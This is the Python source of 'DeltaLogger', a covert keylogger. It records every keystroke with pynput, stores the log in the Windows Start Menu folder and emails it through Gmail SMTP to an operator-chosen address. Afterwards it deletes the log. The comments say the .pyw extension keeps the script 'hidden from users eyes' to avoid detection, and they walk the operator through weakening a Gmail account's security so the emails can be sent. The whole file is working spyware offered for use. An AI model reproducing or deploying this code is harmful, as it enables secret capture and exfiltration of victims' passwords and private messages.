# WELCOME TO DELTALOGGER!

# Libraries

import pynput # Needs to be installed by pip install pynput
import time
import os
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener

# Variables
username = getpass.getuser()
logs = "logs.txt"
file_path = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\"
extend = "\\"
toaddr = "mail to send to" # Put the mail you would like to send logs to, suggest the same mail as the sender.
# So logs will be stored here and you don't have to login to another mail to view logs

# Sending Mails Function
def send_email(filename, attachment, toaddr):
    # Put your gmail, suggest to create a new account, disable 2fa and activate low secure app access(VERY IMPORTANT)
    fromaddr = "your mail"
    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Logs File"

    # string to store the body of the mail
    body = "Logs File"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication, Put your new gmail account password
    s.login(fromaddr, "your gmail password")

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()


end = 0  # DON'T CHANGE IT!

# Here you can select the value. If you want the script to run 5 times you put 5, same thing with other numbers like 200 ecc...
while end < 5:
    # Suggest 30 with following configuration at line 124

    count = 0
    keys = []
    stopper = 0


    def on_press(key):
        global keys, count, stopper

        # print("{0} Pressed".format(key))

        # You can uncomment for see the keys pressed, but the file is in .pyw  extension so you can't see the python gui.
        # I put it in .pyw because the script needs to be hidden from users eyes.
        # If you put it in.py and uncomment the upper line you will se the py gui with all logs, which makes it visible and detectable.

        keys.append(key)
        count += 1
        stopper += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + logs, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_relase(key):
        if key == Key.esc:
            return False
        if stopper > 80:  # Change the value as you prefer. If you put 30 an email with logs will be sent after 30 characters logged and a new "end" cycle will be started.
            return False # Suggest 80


    #The keylogger starts
    with Listener(on_press=on_press, on_release=on_relase) as listener:
        listener.join()

    if stopper > 80:  # You have to put the same value as upper
        send_email(logs, file_path + extend + logs, toaddr)
        # print("Email Sent!") Commented because the script is in .pyw
        end += 1

# How many seconds do the script need to wait before delete logs.txt.
time.sleep(40)
# This happens only when the scripts finishes his runs. The number of runs is the number you put for "end" cycle.
delete_files = [logs]
for file in delete_files:
    os.remove(file_path + extend + file)
# Developed by @Degnato
# Still in developing

# GOODBYE BY DELTALOGGER!
